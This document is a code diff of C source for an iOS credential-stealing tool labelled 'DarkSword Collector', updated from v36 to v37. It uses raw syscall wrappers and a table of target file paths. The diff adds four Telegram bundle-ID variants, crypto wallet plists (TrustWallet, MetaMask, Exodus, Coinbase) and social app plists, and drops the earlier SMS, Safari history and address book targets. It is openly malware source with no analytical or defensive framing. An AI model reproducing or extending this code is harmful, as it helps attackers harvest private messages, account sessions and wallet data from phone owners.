@@ -1,7 +1,5 @@
 /**
- * DarkSword Collector v36 - App credential scan
- * Reads preference plists for target apps + directory listing
- * Files: Telegram, WhatsApp, Facebook, TrustWallet, MetaMask plists + app container dir
+ * DarkSword Collector v37 - Try multiple Telegram bundle IDs + app container scan
  */
 
 static long _svc1(long n, long a) {
@@ -25,27 +23,31 @@ static long _svc4(long n, long a, long b, long c, long d) {
 #define SYS_read 3
 #define SYS_close 6
 #define SYS_lseek 199
-#define SYS_getdirentries 196
 #define SEEK_SET 0
 #define O_RDONLY 0
 
-#define NUM_FILES 8
-#define CHUNKS_PER_FILE 8
+#define NUM_FILES 12
+#define CHUNKS_PER_FILE 5
 
 static volatile int g_ctx = 0;
 
 static const char *get_path(int id) {
     switch (id) {
-        /* Target app preference plists */
+        /* Telegram variants */
         case 0: return "/var/mobile/Library/Preferences/ph.telegra.Telegraph.plist";
-        case 1: return "/var/mobile/Library/Preferences/net.whatsapp.WhatsApp.plist";
-        case 2: return "/var/mobile/Library/Preferences/com.facebook.Facebook.plist";
-        case 3: return "/var/mobile/Library/Preferences/com.sixdays.trustwallet.plist";
-        case 4: return "/var/mobile/Library/Preferences/io.metamask.MetaMask.plist";
-        /* System credential stores */
-        case 5: return "/var/mobile/Library/Safari/History.db";
-        case 6: return "/var/mobile/Library/SMS/sms.db";
-        case 7: return "/var/mobile/Library/AddressBook/AddressBook.sqlitedb";
+        case 1: return "/var/mobile/Library/Preferences/ru.telegram.Telegraph.plist";
+        case 2: return "/var/mobile/Library/Preferences/org.telegram.Telegram.plist";
+        case 3: return "/var/mobile/Library/Preferences/com.Telegram.Telegram.plist";
+        /* Wallet apps */
+        case 4: return "/var/mobile/Library/Preferences/com.sixdays.trustwallet.plist";
+        case 5: return "/var/mobile/Library/Preferences/io.metamask.MetaMask.plist";
+        case 6: return "/var/mobile/Library/Preferences/com.exodusMovement.Exodus.plist";
+        case 7: return "/var/mobile/Library/Preferences/com.coinbase.Coinbase.plist";
+        /* Social apps */
+        case 8: return "/var/mobile/Library/Preferences/net.whatsapp.WhatsApp.plist";
+        case 9: return "/var/mobile/Library/Preferences/com.facebook.Facebook.plist";
+        case 10: return "/var/mobile/Library/Preferences/com.burbn.instagram.plist";
+        case 11: return "/var/mobile/Library/Preferences/com.twitter.twitter.plist";
         default: return (void*)0;
     }
 }
